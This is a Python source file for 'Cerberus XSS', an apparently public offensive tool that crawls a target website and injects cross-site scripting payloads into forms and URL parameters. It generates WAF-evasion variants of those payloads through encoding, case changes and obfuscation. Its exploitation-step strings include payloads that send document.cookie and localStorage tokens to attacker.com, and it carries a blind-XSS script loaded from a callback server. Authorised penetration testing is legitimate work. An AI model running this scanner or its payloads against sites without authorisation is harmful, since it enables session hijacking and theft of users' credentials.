import requests
import argparse
import urllib.parse
from bs4 import BeautifulSoup
import time
import json
import re
import random
import os
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, BarColumn, TextColumn
from rich.prompt import Prompt, Confirm
from rich.panel import Panel

# Cerberus XSS by Sudeepa Wanigarathne
# Advanced XSS testing tool with enhanced WAF bypass and rich terminal UI

class CerberusXSS:
    def __init__(self, target_url, output_file="cerberus_xss_report.json", rate_limit=1, proxy=None):
        self.target_url = target_url
        self.output_file = output_file
        self.rate_limit = rate_limit
        self.proxy = {'http': proxy, 'https': proxy} if proxy else None
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'CerberusXSS/2.0 (Penetration Testing Tool)'})
        self.vulnerabilities = []
        self.payloads = self.load_payloads()
        self.visited_urls = set()
        self.session_file = "cerberus_xss_session.json"
        self.console = Console()
        self.load_session()

    def print_banner(self):
        """Display a beautiful ASCII banner with an injection icon."""
        banner = """
        ╔════════════════════════════════════════════════════╗
        ║                                                    ║
        ║      Cerberus XSS - Advanced Penetration Tool      ║
        ║          Author: Sudeepa Wanigarathne             ║
        ║                                                    ║
        ║       </>  Injecting Security, Ethically  -->      ║
        ║                                                    ║
        ╚════════════════════════════════════════════════════╝
        """
        self.console.print(Panel(banner, title="Cerberus XSS", style="bold cyan"))

    def load_payloads(self):
        """Load an advanced set of XSS payloads, including WAF bypass techniques."""
        base_payloads = [
            "<script>alert('XSS')</script>",  # Basic Reflected/Stored XSS
            "javascript:alert('XSS')",       # JavaScript URI
            "<img src=x onerror=alert('XSS')>",  # Event-based
            "<svg onload=alert('XSS')>",    # SVG-based
            "%3Cscript%3Ealert('XSS')%3C/script%3E",  # URL-encoded
            "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",  # HTML entity encoded
            "<img src='#' onerror='eval(location.hash.substr(1))'>",  # DOM-based XSS
            f"<script src='http://your-callback-server.com/xss.js?cb={int(time.time())}'></script>",  # Blind XSS
            "<div onmouseover=alert('XSS')>Hover</div>",  # Mouse event
            "<input value='' autofocus onfocus=alert('XSS')>",  # Attribute-based
            # Polyglot payload (works in multiple contexts)
            "jaVasCript:/*--></title></style></textarea></script></xmp><svg/onload=alert('XSS')>",
        ]
        waf_bypass_payloads = []
        for payload in base_payloads:
            waf_bypass_payloads.append(self.randomize_case(payload))
            waf_bypass_payloads.append(self.inject_comments(payload))
            waf_bypass_payloads.append(self.add_whitespace(payload))
            if 'alert' in payload:
                waf_bypass_payloads.append(self.obfuscate_js(payload))
            waf_bypass_payloads.append(urllib.parse.quote(urllib.parse.quote(payload)))
            waf_bypass_payloads.append(self.nested_encoding(payload))
        return list(set(base_payloads + waf_bypass_payloads))

    def randomize_case(self, payload):
        """Randomize case of letters in the payload to bypass WAF."""
        return ''.join(random.choice([c.upper(), c.lower()]) for c in payload)

    def inject_comments(self, payload):
        """Inject HTML or JavaScript comments to bypass WAF."""
        if '<script' in payload:
            return payload.replace('<script', '<!-- --> <script').replace('</script>', '</script> /* */')
        return f"<!-- {payload} -->"

    def add_whitespace(self, payload):
        """Add random whitespace to bypass WAF."""
        return payload.replace('<', '< ').replace('>', ' >')

    def obfuscate_js(self, payload):
        """Obfuscate JavaScript in the payload to evade WAF."""
        if 'alert' in payload:
            return payload.replace("alert('XSS')", "String.fromCharCode(97,108,101,114,116)('XSS')")
        return payload

    def nested_encoding(self, payload):
        """Apply nested encoding to bypass WAF."""
        return urllib.parse.quote(payload.replace('alert', '%61%6C%65%72%74'))

    def load_session(self):
        """Load previous session data if available."""
        if os.path.exists(self.session_file):
            with open(self.session_file, 'r') as f:
                data = json.load(f)
                self.visited_urls = set(data.get('visited_urls', []))
                self.vulnerabilities = data.get('vulnerabilities', [])

    def save_session(self):
        """Save current session data."""
        data = {
            'target_url': self.target_url,
            'visited_urls': list(self.visited_urls),
            'vulnerabilities': self.vulnerabilities
        }
        with open(self.session_file, 'w') as f:
            json.dump(data, f, indent=4)

    def spider(self, url, depth=0, max_depth=2):
        """Crawl the target website to find forms and parameters."""
        if url in self.visited_urls or depth > max_depth:
            return
        self.visited_urls.add(url)
        try:
            response = self.session.get(url, timeout=5, proxies=self.proxy)
            if response.status_code != 200:
                return
            soup = BeautifulSoup(response.text, 'html.parser')
            
            forms = soup.find_all('form')
            links = soup.find_all('a', href=True)
            total_tasks = len(forms) + len(links)
            
            with Progress(
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                transient=True
            ) as progress:
                task = progress.add_task(f"[cyan]Crawling {url}", total=total_tasks)
                
                for form in forms:
                    action = form.get('action', url)
                    method = form.get('method', 'get').lower()
                    inputs = form.find_all('input')
                    params = {inp.get('name'): '' for inp in inputs if inp.get('name')}
                    self.test_form(url, action, method, params)
                    progress.advance(task)
                
                for link in links:
                    link_url = urllib.parse.urljoin(url, link['href'])
                    parsed = urllib.parse.urlparse(link_url)
                    if parsed.netloc == urllib.parse.urlparse(self.target_url).netloc:
                        query_params = urllib.parse.parse_qs(parsed.query)
                        if query_params:
                            self.test_params(link_url, query_params)
                        if depth < max_depth:
                            self.spider(link_url, depth + 1, max_depth)
                    progress.advance(task)
            
            self.save_session()
            time.sleep(self.rate_limit)
        except Exception as e:
            self.console.print(f"[red]Error crawling {url}: {e}")

    def test_form(self, base_url, action, method, params):
        """Test form inputs for XSS vulnerabilities."""
        action_url = urllib.parse.urljoin(base_url, action)
        with Progress(
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            transient=True
        ) as progress:
            task = progress.add_task(f"[cyan]Testing form {action_url}", total=len(params) * len(self.payloads))
            for param in params:
                for payload in self.payloads:
                    params[param] = payload
                    try:
                        if method == 'post':
                            response = self.session.post(action_url, data=params, timeout=5, proxies=self.proxy)
                        else:
                            query = urllib.parse.urlencode(params)
                            test_url = f"{action_url}?{query}"
                            response = self.session.get(test_url, timeout=5, proxies=self.proxy)
                        self.check_response(response, payload, action_url, params, method)
                        progress.advance(task)
                        time.sleep(self.rate_limit)
                    except Exception as e:
                        self.console.print(f"[red]Error testing form {action_url}: {e}")

    def test_params(self, url, params):
        """Test URL parameters for XSS vulnerabilities."""
        with Progress(
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            transient=True
        ) as progress:
            task = progress.add_task(f"[cyan]Testing URL {url}", total=len(params) * len(self.payloads))
            for param in params:
                for payload in self.payloads:
                    params[param] = [payload]
                    query = urllib.parse.urlencode(params, doseq=True)
                    parsed = urllib.parse.urlparse(url)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"
                    try:
                        response = self.session.get(test_url, timeout=5, proxies=self.proxy)
                        self.check_response(response, payload, test_url, params, 'get')
                        progress.advance(task)
                        time.sleep(self.rate_limit)
                    except Exception as e:
                        self.console.print(f"[red]Error testing URL {test_url}: {e}")

    def detect_context(self, response_text, payload):
        """Detect the context of the payload in the response."""
        if re.search(re.escape(payload), response_text, re.IGNORECASE):
            if re.search(r'<script[^>]*>.*?' + re.escape(payload) + '.*?</script>', response_text, re.IGNORECASE):
                return 'JavaScript Context', 'High'
            if re.search(r'<[^>]+' + re.escape(payload) + '[^>]*>', response_text, re.IGNORECASE):
                return 'HTML Attribute Context', 'Medium'
            if re.search(r'<!--.*?-->', response_text, re.IGNORECASE):
                return 'HTML Comment Context', 'Low'
            return 'HTML Context', 'Medium'
        if 'eval(location.hash' in payload and 'location.hash' in response_text:
            return 'DOM-based XSS (Potential)', 'High'
        if 'your-callback-server' in payload:
            with open('blind_xss_log.txt', 'a') as f:
                f.write(f"Blind XSS payload sent: {payload} at {datetime.now().isoformat()}\n")
            return 'Blind XSS (Callback)', 'High'
        return 'Unknown Context', 'Low'

    def check_response(self, response, payload, url, params, method):
        """Check if the payload is reflected and determine vulnerability details."""
        context, severity = self.detect_context(response.text, payload)
        if payload in response.text or re.search(re.escape(payload), response.text, re.IGNORECASE) or context == 'Blind XSS (Callback)':
            poc = self.generate_poc(url, params, method, payload)
            vuln = {
                'url': url,
                'payload': payload,
                'params': params,
                'method': method.upper(),
                'context': context,
                'severity': severity,
                'type': 'Reflected XSS' if context not in ['DOM-based XSS (Potential)', 'Blind XSS (Callback)'] else context,
                'poc': poc,
                'exploitation': self.generate_exploitation_steps(payload, context),
                'remediation': 'Sanitize and encode user inputs, implement Content Security Policy (CSP), and use secure frameworks.',
                'timestamp': datetime.now().isoformat()
            }
            self.vulnerabilities.append(vuln)
            self.console.print(f"[red][!] Vulnerable: {url}[/red]\n    Payload: {payload}\n    Context: {context}\n    Severity: {severity}\n    PoC: {poc}")

    def generate_poc(self, url, params, method, payload):
        """Generate a proof-of-concept to demonstrate the vulnerability."""
        if method.upper() == 'POST':
            return f"POST {url} with data: {json.dumps(params)}"
        query = urllib.parse.urlencode(params)
        return f"{url}?{query}"

    def generate_exploitation_steps(self, payload, context):
        """Generate detailed exploitation steps for the vulnerability."""
        steps = f"1. Inject the payload '{payload}' into the vulnerable parameter.\n"
        if context == 'JavaScript Context':
            steps += "2. Executes as JavaScript, enabling cookie theft, session hijacking, or site defacement.\n"
            steps += "3. Example exploit: <script>fetch('https://attacker.com?cookie='+document.cookie);</script>"
        elif context == 'HTML Attribute Context':
            steps += "2. Triggers an event (e.g., onerror), executing malicious JavaScript.\n"
            steps += "3. Example exploit: <img src=x onerror=fetch('https://attacker.com?data='+localStorage.getItem('token'))>"
        elif context == 'DOM-based XSS (Potential)':
            steps += "2. Manipulates DOM via client-side scripts (e.g., location.hash).\n"
            steps += "3. Example exploit: Navigate to {url}#alert(document.cookie)"
        elif context == 'Blind XSS (Callback)':
            steps += "2. Executes on a different page or user session, sending data to a callback server.\n"
            steps += "3. Check logs at http://your-callback-server.com for triggers."
        else:
            steps += "2. Renders as HTML, potentially injecting scripts or phishing forms.\n"
            steps += "3. Example exploit: <script>alert('Your session is compromised!');</script>"
        return steps

    def generate_report(self):
        """Generate a JSON report and display vulnerabilities in a table."""
        report = {
            'tool': 'Cerberus XSS',
            'author': 'Sudeepa Wanigarathne',
            'target': self.target_url,
            'vulnerable': len(self.vulnerabilities) > 0,
            'vulnerabilities': self.vulnerabilities,
            'timestamp': datetime.now().isoformat()
        }
        with open(self.output_file, 'w') as f:
            json.dump(report, f, indent=4)
        
        self.console.print(f"[green][+] Report saved to {self.output_file}[/green]")
        if report['vulnerable']:
            self.console.print(f"[red][!] Target {self.target_url} is VULNERABLE to XSS![/red]")
            table = Table(title="Vulnerabilities Found")
            table.add_column("URL", style="cyan")
            table.add_column("Payload", style="magenta")
            table.add_column("Context", style="yellow")
            table.add_column("Severity", style="red")
            table.add_column("PoC", style="green")
            for vuln in self.vulnerabilities:
                table.add_row(
                    vuln['url'],
                    vuln['payload'],
                    vuln['context'],
                    vuln['severity'],
                    vuln['poc']
                )
            self.console.print(table)
        else:
            self.console.print(f"[green][+] No XSS vulnerabilities found on {self.target_url}[/green]")

    def interactive_menu(self):
        """Display an interactive menu to configure the scan."""
        self.print_banner()
        self.console.print("[yellow]Welcome to Cerberus XSS by Sudeepa Wanigarathne[/yellow]")
        if Confirm.ask("Do you have permission to test this target?", default=True):
            self.target_url = Prompt.ask("Enter target URL", default=self.target_url)
            self.output_file = Prompt.ask("Enter output file", default=self.output_file)
            self.rate_limit = float(Prompt.ask("Enter rate limit (seconds)", default=str(self.rate_limit)))
            max_depth = int(Prompt.ask("Enter max crawling depth", default="2"))
            proxy = Prompt.ask("Enter proxy (e.g., http://127.0.0.1:8080) or press Enter to skip", default="")
            if proxy:
                self.proxy = {'http': proxy, 'https': proxy}
            self.console.print("[cyan]Starting scan...[/cyan]")
            self.run(max_depth)
        else:
            self.console.print("[red]Permission denied. Exiting...[/red]")
            exit(1)

    def run(self, max_depth=2):
        """Run the XSS testing process."""
        self.spider(self.target_url, max_depth=max_depth)
        self.generate_report()
        self.console.print(f"[cyan][*] Testing complete. Found {len(self.vulnerabilities)} potential vulnerabilities.[/cyan]")

def main():
    parser = argparse.ArgumentParser(description='Cerberus XSS: Advanced XSS testing tool by Sudeepa Wanigarathne')
    parser.add_argument('url', nargs='?', help='Target URL to test (e.g., http://example.com)')
    parser.add_argument('--output', default='cerberus_xss_report.json', help='Output file for the report')
    parser.add_argument('--rate-limit', type=float, default=1, help='Seconds to wait between requests')
    parser.add_argument('--depth', type=int, default=2, help='Maximum crawling depth')
    parser.add_argument('--proxy', help='Proxy for requests (e.g., http://127.0.0.1:8080)')
    args = parser.parse_args()

    tester = CerberusXSS(args.url or "http://example.com", args.output, args.rate_limit, args.proxy)
    tester.interactive_menu()

if __name__ == "__main__":
    main()
